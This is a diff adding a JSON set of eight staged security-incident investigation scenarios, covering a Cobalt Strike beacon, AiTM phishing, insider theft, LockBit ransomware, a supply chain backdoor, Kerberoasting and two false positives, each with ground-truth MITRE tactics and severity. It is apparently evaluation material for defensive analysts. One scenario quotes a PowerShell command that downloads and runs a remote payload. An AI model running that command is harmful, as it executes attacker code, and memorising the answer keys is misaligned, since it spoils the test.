@@ -1,0 +1,284 @@
+[
+  {
+    "id": "inv_001",
+    "title": "PowerShell C2 Beacon Investigation",
+    "attack_type": "malware",
+    "attack_started_at_turn": 1,
+    "attack_sophistication": "high",
+    "ground_truth_mitre_tactic": "TA0011",
+    "ground_truth_mitre_technique": "T1071.001",
+    "ground_truth_mitre_tactics": ["TA0011", "TA0002", "TA0005"],
+    "ground_truth_severity": "P1",
+    "max_turns": 4,
+    "turns": [
+      {
+        "turn": 1,
+        "alert_text": "SIEM Alert: Unusual outbound HTTPS traffic from DEV-WS-042. Process 'powershell.exe' is making periodic connections to 203.0.113.88:443 at 300-second intervals. No business justification found.",
+        "alert_source": "siem",
+        "source_ip": "192.168.10.42",
+        "dest_ip": "203.0.113.88",
+        "hostname": "DEV-WS-042",
+        "user_account": "dev.user9",
+        "analyst_prompt": "Analyze this initial alert. What information do you need to determine if this is malicious?"
+      },
+      {
+        "turn": 2,
+        "additional_context": "Process tree for powershell.exe on DEV-WS-042:\n  explorer.exe (PID 1024)\n  └─ winword.exe (PID 3308) — opened 'Project_Proposal.docx' 45 min ago\n     └─ powershell.exe (PID 5540) -w hidden -enc [base64 string]\n        └─ conhost.exe (PID 5541)\n\nDecoded PowerShell: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.88/stage2')\n\nNetwork: 203.0.113.88 flagged by 7/83 VirusTotal vendors. Domain: 'cdn-update-helper.net' registered 8 days ago.",
+        "analyst_prompt": "The process tree and decoded PowerShell are provided. What is the nature of this threat?"
+      },
+      {
+        "turn": 3,
+        "additional_context": "Memory forensics on DEV-WS-042:\n- Cobalt Strike beacon artifact found in powershell.exe process memory\n- Beacon configuration: watermark=1234567890, sleep=300s, jitter=20%, C2=203.0.113.88\n- Lateral movement detected: powershell.exe spawned PsExec to DEV-WS-041 and DEV-WS-043 at 14:22:07\n- Both DEV-WS-041 and DEV-WS-043 now show same beacon traffic pattern\n\nFile: 'Project_Proposal.docx' contains malicious macro — VBA code with base64-encoded shellcode dropper.",
+        "analyst_prompt": "Lateral movement has been confirmed. How would you assess severity and what immediate containment is required?"
+      },
+      {
+        "turn": 4,
+        "additional_context": "IR Team Update:\n- dev.user9 received 'Project_Proposal.docx' via email from spoofed address 3 hours ago\n- Check of email gateway shows 4 other employees received the same document\n- 2 of them also opened it: DEV-WS-039 and DEV-WS-044 also beaconing\n- Total compromised hosts: 5 (DEV-WS-039, DEV-WS-041, DEV-WS-042, DEV-WS-043, DEV-WS-044)\n- Beacon has been active for 3 hours — attacker had extended dwell time",
+        "analyst_prompt": "You now have the full picture. Provide your final MITRE ATT&CK tactic, severity rating, and incident response summary."
+      }
+    ]
+  },
+  {
+    "id": "inv_002",
+    "title": "CEO Email Compromise → Wire Fraud Investigation",
+    "attack_type": "phishing",
+    "attack_started_at_turn": 1,
+    "attack_sophistication": "high",
+    "ground_truth_mitre_tactic": "TA0001",
+    "ground_truth_mitre_technique": "T1566.002",
+    "ground_truth_mitre_tactics": ["TA0001", "TA0010", "TA0040"],
+    "ground_truth_severity": "P1",
+    "max_turns": 4,
+    "turns": [
+      {
+        "turn": 1,
+        "alert_text": "Unusual activity on CEO account: ceo@corp.com authenticated from Moscow, Russia (IP 5.101.40.81) at 03:14 AM UTC while the CEO is known to be in New York. An email was sent to AP team requesting immediate wire transfer.",
+        "alert_source": "siem",
+        "source_ip": "5.101.40.81",
+        "dest_ip": null,
+        "hostname": "Exchange-Online",
+        "user_account": "ceo@corp.com",
+        "analyst_prompt": "Impossible travel alert received. Assess the situation."
+      },
+      {
+        "turn": 2,
+        "additional_context": "Email sent from CEO account at 03:14 AM to ap-team@corp.com:\n  Subject: URGENT: Confidential Wire Transfer Required\n  Body: 'Please process an immediate wire of $450,000 USD to the following account for an acquisition we are finalizing. This is time-sensitive and confidential — do not discuss with others. [Bank details attached]'\n\nAzure AD sign-in logs:\n- 02:47 AM — CEO normal sign-in from New York (IP 73.188.92.10) — MFA passed\n- 02:51 AM — Session token issued\n- 03:14 AM — New session from Moscow IP using SAME valid session token — no MFA required (token hijack)\n\nMFA was NOT triggered for the second session because the first session token was reused.",
+        "analyst_prompt": "A session token was hijacked. What attack technique is being used and what is the scope?"
+      },
+      {
+        "turn": 3,
+        "additional_context": "AP Team response:\n- AP Manager received the wire request email and was suspicious\n- AP Manager called CEO directly — CEO confirmed they did NOT send the email and are currently in New York\n- Wire transfer has NOT been processed yet (still pending Manager approval)\n\nAdditional forensics:\n- Adversary-in-the-Middle (AiTM) phishing kit identified: CEO clicked a link in a Tuesday email that proxied through 'corpauth-login.net' — recorded credentials AND session token\n- 'corpauth-login.net' registered 4 days ago in Romania\n- CEO's Outlook inbox now has a malicious rule forwarding all future emails to 'ceo.backup.account@tutanota.com'",
+        "analyst_prompt": "AiTM phishing is confirmed. What is the full attack chain and what must be done immediately?"
+      },
+      {
+        "turn": 4,
+        "additional_context": "Status update:\n- Wire transfer successfully blocked\n- CEO account suspended pending full investigation\n- Total emails accessed by attacker: 847 emails over 27 minutes (including M&A discussions, board communications)\n- Email forwarding rule deleted\n- Second forensic finding: attacker also accessed CEO's calendar and SharePoint for the past 6 months\n\nDiscovery suggests attacker may have been inside CEO's account in read-only mode for 6 months before attempting financial fraud.",
+        "analyst_prompt": "The full scope is now known. Provide MITRE ATT&CK tactic, severity, and comprehensive incident response."
+      }
+    ]
+  },
+  {
+    "id": "inv_003",
+    "title": "Insider Threat — Engineering IP Theft",
+    "attack_type": "data_exfil",
+    "attack_started_at_turn": 2,
+    "attack_sophistication": "medium",
+    "ground_truth_mitre_tactic": "TA0010",
+    "ground_truth_mitre_technique": "T1052.001",
+    "ground_truth_mitre_tactics": ["TA0009", "TA0010"],
+    "ground_truth_severity": "P2",
+    "max_turns": 3,
+    "turns": [
+      {
+        "turn": 1,
+        "alert_text": "DLP Alert: USB storage device 'SanDisk Ultra 64GB' (Serial: 4C530200030522116282) connected to WKSTN-ENG-114 at 17:42 — outside normal business hours. User: eng.zhang. Last USB connection for this user: 8 months ago. No files transferred in this session.",
+        "alert_source": "edr",
+        "source_ip": null,
+        "dest_ip": null,
+        "hostname": "WKSTN-ENG-114",
+        "user_account": "eng.zhang",
+        "analyst_prompt": "A USB was connected outside business hours. Is this notable and what follow-up do you recommend?"
+      },
+      {
+        "turn": 2,
+        "additional_context": "Next day — DLP Alert: Same USB device reconnected to WKSTN-ENG-114 at 18:55 (after most staff have left). This time, file transfer activity detected:\n\nFiles copied to USB:\n- /src/proprietary_algo_v7_FINAL.py (47 MB) — marked CONFIDENTIAL\n- /models/trained_model_weights_prod.pkl (1.2 GB) — marked TOP SECRET\n- /docs/patent_pending_architecture.pdf (8 MB) — marked CONFIDENTIAL\n- /data/customer_dataset_anonymized.csv (340 MB)\n\nHR note: eng.zhang gave notice 3 weeks ago. Last day is Friday. Exit interview is tomorrow morning.",
+        "analyst_prompt": "Significant IP exfiltration has occurred by an employee on notice. How do you classify and respond?"
+      },
+      {
+        "turn": 3,
+        "additional_context": "Investigation findings:\n- Security review of eng.zhang's recent activity shows: over last 3 weeks, accessed 340% more files than their 6-month baseline\n- Git clone of entire private repository 2 weeks ago (never done before)\n- LinkedIn profile updated to show new employer (competitor company) 10 days ago\n- USB serial number not in approved device inventory\n- Files copied include next-generation algorithm not yet published — estimated IP value: $15–$50 million\n\nLegal has been briefed. They want to proceed quietly to gather full forensic evidence before confronting the employee.",
+        "analyst_prompt": "Provide final MITRE ATT&CK classification, severity, and the careful containment strategy balancing evidence preservation vs. business risk."
+      }
+    ]
+  },
+  {
+    "id": "inv_004",
+    "title": "Ransomware Deployment Chain",
+    "attack_type": "malware",
+    "attack_started_at_turn": 1,
+    "attack_sophistication": "high",
+    "ground_truth_mitre_tactic": "TA0040",
+    "ground_truth_mitre_technique": "T1486",
+    "ground_truth_mitre_tactics": ["TA0001", "TA0011", "TA0040"],
+    "ground_truth_severity": "P1",
+    "max_turns": 4,
+    "turns": [
+      {
+        "turn": 1,
+        "alert_text": "EDR Alert: Domain admin credentials used outside of business hours. 'corp\\da_admin2' authenticated to 12 servers between 02:00 and 02:30 AM from WKSTN-HR-031. This account is normally used only during planned maintenance windows (last window: 3 weeks ago). WMI remote execution activity detected on each target server.",
+        "alert_source": "edr",
+        "source_ip": "192.168.6.31",
+        "dest_ip": "multiple",
+        "hostname": "WKSTN-HR-031",
+        "user_account": "corp\\da_admin2",
+        "analyst_prompt": "Off-hours domain admin lateral movement detected. What is your initial assessment?"
+      },
+      {
+        "turn": 2,
+        "additional_context": "Forensics on WKSTN-HR-031:\n- Domain admin password found in cleartext in 'C:\\Users\\hr31user\\AppData\\Local\\Temp\\password_list.txt'\n- hr31user's workstation was compromised 6 days ago via a phishing email with a macro dropper\n- Attacker installed a keylogger that captured da_admin2 password when IT performed maintenance\n\nActions performed by attacker via WMI on 12 servers:\n- Disabled Windows Defender real-time protection\n- Disabled Windows Update service\n- Disabled backup services\n- Installed remote monitoring tool 'AnyDesk' for persistent access\n\nNo encryption or destruction has occurred yet.",
+        "analyst_prompt": "Pre-ransomware staging is confirmed. What is the immediate priority and how do you respond without triggering the attack?"
+      },
+      {
+        "turn": 3,
+        "additional_context": "CRITICAL UPDATE — 03:47 AM:\nRansomware encryption has begun on FILESVR-02 and FILESVR-03.\nVssadmin deleting shadow copies on all 12 servers simultaneously.\nFile extension being changed to '.encrypted_LockBit3'\nRansom note dropped in C:\\ransom_note.txt: 'Your network has been compromised by LockBit 3.0. Pay 50 BTC within 72 hours. Contact: [dark web URL]'\n\nStatus of 12 servers:\n- 4 fully encrypted (file shares offline)\n- 5 currently encrypting (IO spike visible)\n- 3 not yet started (may still be stoppable)\n\nHR-031 user (hr31user) has been reached by phone — they have no knowledge of any of this.",
+        "analyst_prompt": "Active ransomware encryption is underway. What is your emergency response protocol for the 3 servers not yet encrypted?"
+      },
+      {
+        "turn": 4,
+        "additional_context": "IR Response Status:\n- 3 remaining servers successfully isolated before encryption began\n- 9 servers remain encrypted — 23 TB of business data affected\n- Finance and HR file shares are completely offline\n- Backups: last clean backup is 48 hours old, stored in immutable Azure Blob container (not accessed by attacker — offline backup strategy saved us)\n- CEO has been briefed. Board meeting called for 9 AM.\n- Legal counsel engaged. Cyber insurance carrier notified.\n- Decision pending: pay ransom or restore from backup?\n\nRestoration estimate from backup: 3–4 days for full recovery.",
+        "analyst_prompt": "Provide full incident classification, the pay-vs-restore analysis, and your recommended recovery strategy."
+      }
+    ]
+  },
+  {
+    "id": "inv_005",
+    "title": "False Positive — Red Team Exercise Simulation",
+    "attack_type": "false_positive",
+    "attack_started_at_turn": null,
+    "attack_sophistication": "low",
+    "ground_truth_mitre_tactic": null,
+    "ground_truth_mitre_technique": null,
+    "ground_truth_mitre_tactics": [],
+    "ground_truth_severity": "P4",
+    "max_turns": 3,
+    "turns": [
+      {
+        "turn": 1,
+        "alert_text": "SIEM Correlation: Multiple high-severity indicators triggered simultaneously on subnet 10.50.0.0/24: (1) Port scanning from 10.50.0.5; (2) Mimikatz signatures on 10.50.0.12; (3) BloodHound AD enumeration from 10.50.0.7; (4) Lateral movement via PsExec between 10.50.0.5 and 10.50.0.20. All activity began at exactly 09:00 AM.",
+        "alert_source": "siem",
+        "source_ip": "10.50.0.5",
+        "dest_ip": "10.50.0.0/24",
+        "hostname": "RT-KALI-001",
+        "user_account": "redteam_user",
+        "analyst_prompt": "Multiple serious indicators firing simultaneously at exactly 9 AM. What is your immediate assessment?"
+      },
+      {
+        "turn": 2,
+        "additional_context": "Lookup results:\n- Subnet 10.50.0.0/24 is the Security Lab / Red Team segment (isolated VLAN)\n- Host 10.50.0.5 is RT-KALI-001, registered in asset inventory as Red Team workstation\n- CMDB entry for RT-KALI-001: 'Authorized Penetration Testing Platform — do not quarantine'\n- Change management ticket CHG-2025-0487 approved by CISO: 'Monthly Red Team Exercise — Q1 Assessment — March 1-5, 2025 09:00-17:00'\n- Today is March 3, 2025 (within the authorized window)\n- All activity is on isolated segment — no production network traffic",
+        "analyst_prompt": "Context shows this is on the red team segment during an authorized exercise window. How do you proceed?"
+      },
+      {
+        "turn": 3,
+        "additional_context": "Verification complete:\n- Called Red Team lead (Marcus Webb, ext 5521) — confirmed active exercise is in progress\n- All indicators are expected artifacts of the exercise\n- Red Team is testing SOC detection capabilities (meta: they were testing whether SOC would correctly identify this as authorized)\n- SIEM rules need tuning to suppress red team segment alerts during authorized windows\n\nAction taken: Alert marked as false positive, authorized activity. Recommended SIEM improvement: Add suppression rule for 10.50.0.0/24 during approved change windows.",
+        "analyst_prompt": "Provide your final classification and any process improvement recommendations."
+      }
+    ]
+  },
+  {
+    "id": "inv_006",
+    "title": "Supply Chain Compromise via Software Update",
+    "attack_type": "malware",
+    "attack_started_at_turn": 1,
+    "attack_sophistication": "high",
+    "ground_truth_mitre_tactic": "TA0001",
+    "ground_truth_mitre_technique": "T1195.002",
+    "ground_truth_mitre_tactics": ["TA0001", "TA0011", "TA0003"],
+    "ground_truth_severity": "P1",
+    "max_turns": 3,
+    "turns": [
+      {
+        "turn": 1,
+        "alert_text": "Threat intelligence feed alert: Vendor 'NetManage Pro' (a network monitoring tool deployed on 47 of our servers) has released an emergency advisory. Version 6.2.1 (deployed 3 days ago via auto-update) contains a backdoor. The backdoor establishes a persistent connection to 'update.netmanage-cloud.net'. IOC: process 'nmpsvc.exe' making outbound connections to 185.220.101.55:8443.",
+        "alert_source": "threat_intel",
+        "source_ip": null,
+        "dest_ip": "185.220.101.55",
+        "hostname": "multiple",
+        "user_account": "SYSTEM",
+        "analyst_prompt": "A supply chain compromise has been disclosed. What is your immediate triage priority?"
+      },
+      {
+        "turn": 2,
+        "additional_context": "Internal investigation findings:\n- Confirmed: NetManage Pro v6.2.1 auto-updated on 47 of our servers 3 days ago\n- 47 servers include: 12 DMZ servers, 8 database servers, 15 application servers, 12 internal servers\n- Process nmpsvc.exe confirmed on all 47 servers — all are beaconing to 185.220.101.55\n- Backdoor has been active for 72 hours — attacker had full system access as SYSTEM on all 47 servers\n- Network traffic analysis: 1.8 GB of outbound data from DB server cluster during this period\n- Vendor: NetManage Pro has released a clean version 6.2.2 and has reported the incident to CISA",
+        "analyst_prompt": "47 servers compromised, including database servers with potential data exfiltration. How do you scope and prioritize remediation?"
+      },
+      {
+        "turn": 3,
+        "additional_context": "Forensic analysis results:\n- Attacker accessed database servers SRV-DB-01 through SRV-DB-04 (47+ million customer records)\n- Evidence of SQL queries run: SELECT * FROM customers, SELECT * FROM payment_methods\n- 1.8 GB exfiltrated data likely contains customer PII and payment information\n- Backdoor also created a new local admin account 'nmpsupport' on all 47 servers\n- No evidence of further lateral movement beyond the 47 compromised servers\n\nThis triggers GDPR Article 33 notification (72-hour deadline to notify supervisory authority) and potentially CCPA requirements.",
+        "analyst_prompt": "Data breach is confirmed. Provide MITRE classification, regulatory notification strategy, and full remediation plan."
+      }
+    ]
+  },
+  {
+    "id": "inv_007",
+    "title": "Kerberoasting + Privilege Escalation",
+    "attack_type": "lateral_movement",
+    "attack_started_at_turn": 1,
+    "attack_sophistication": "medium",
+    "ground_truth_mitre_tactic": "TA0006",
+    "ground_truth_mitre_technique": "T1558.003",
+    "ground_truth_mitre_tactics": ["TA0006", "TA0004", "TA0008"],
+    "ground_truth_severity": "P2",
+    "max_turns": 3,
+    "turns": [
+      {
+        "turn": 1,
+        "alert_text": "IDS Alert: Abnormal Kerberos TGS request pattern from WKSTN-FIN-088. 223 TGS_REQ for service tickets within 45 seconds. Source: john.reeves (Finance analyst). Normal baseline for this account: 3–5 service ticket requests per day. Domain controller logs confirm all requests.",
+        "alert_source": "ids",
+        "source_ip": "192.168.3.88",
+        "dest_ip": "192.168.1.10",
+        "hostname": "WKSTN-FIN-088",
+        "user_account": "john.reeves",
+        "analyst_prompt": "High-volume Kerberos TGS requests detected. What is your assessment?"
+      },
+      {
+        "turn": 2,
+        "additional_context": "EDR forensics on WKSTN-FIN-088:\n- Rubeus.exe (Kerberoasting tool) executed from C:\\Users\\Public\\Downloads\\rubeus.exe at 11:23:07 AM\n- File hash: b94f5a980ec40d9a4eba2b9db4b9d5c7 — matches known Rubeus v2.2.0\n- 223 service tickets captured in file 'C:\\Users\\Public\\Downloads\\tickets.kirbi'\n- john.reeves account: Finance analyst, no privileged access, employee for 3 years\n- john.reeves opened email attachment 'Benefits_Update_2025.pdf.exe' at 11:19 AM (4 min before Rubeus)\n- The attacker is operating as john.reeves but the initial access was via phishing\n\nTickets exported include: MSSQLSvc (mssql@corp.com), HTTP/webapp01, LDAP/DC01, BackupSvc@corp.com",
+        "analyst_prompt": "Rubeus confirmed, phishing initial access. What are the high-risk SPNs being targeted and what is the escalation risk?"
+      },
+      {
+        "turn": 3,
+        "additional_context": "Offline password cracking results (security team recovered the ticket file):\n- MSSQLSvc@corp.com — password cracked in 3 minutes (weak password: 'Summer2022!')\n- HTTP/webapp01 — NOT cracked (strong password)\n- BackupSvc@corp.com — password cracked in 47 minutes ('Backup$2023')\n\nSIEM Log: 30 minutes after Kerberoasting — new logon event on SRV-DB-01 using MSSQLSvc account from the same workstation. SQL Server commands executed include: xp_cmdshell enabled, new sysadmin account 'dbm_support' created.\n\nAttacker now has full database server access and has potentially pivoted.",
+        "analyst_prompt": "Privilege escalation to database server is confirmed. Provide MITRE ATT&CK classification, severity, and containment plan."
+      }
+    ]
+  },
+  {
+    "id": "inv_008",
+    "title": "False Positive — Automated DevOps Pipeline",
+    "attack_type": "false_positive",
+    "attack_started_at_turn": null,
+    "attack_sophistication": "low",
+    "ground_truth_mitre_tactic": null,
+    "ground_truth_mitre_technique": null,
+    "ground_truth_mitre_tactics": [],
+    "ground_truth_severity": "P4",
+    "max_turns": 2,
+    "turns": [
+      {
+        "turn": 1,
+        "alert_text": "Firewall + EDR combined alert: Jenkins CI server (10.40.0.50) is: (1) SSH-ing into 25 production servers within 5 minutes; (2) Downloading packages from multiple external repos (PyPI, npm, Docker Hub); (3) Running elevated commands via sudo on all target servers; (4) Spawning Python and Node.js processes. Traffic volume: 4.2 GB inbound from internet.",
+        "alert_source": "firewall",
+        "source_ip": "10.40.0.50",
+        "dest_ip": "10.10.0.0/24",
+        "hostname": "JENKINS-PROD-01",
+        "user_account": "svc_jenkins",
+        "analyst_prompt": "Mass SSH connections and external package downloads from CI server. How do you triage this?"
+      },
+      {
+        "turn": 2,
+        "additional_context": "CMDB lookup for JENKINS-PROD-01:\n- Authorized CI/CD server — Jenkins v2.440.1\n- Scheduled deployment job: 'prod-release-v3.4.1' triggered at 14:00 UTC (matches alert time)\n- Change management: CHANGE-2025-0341 approved, deployment window 14:00-16:00 UTC today\n- svc_jenkins account: Service account with sudo rights scoped to deployment scripts only\n- External downloads: All from approved dependency mirrors in allowlist\n- All 25 target servers are in the prod application cluster (expected)\n\nRunbook: This is standard deployment behavior. Same pattern runs every 2 weeks.",
+        "analyst_prompt": "All context confirms this is authorized. Provide your final classification and any tuning recommendations."
+      }
+    ]
+  }
+]
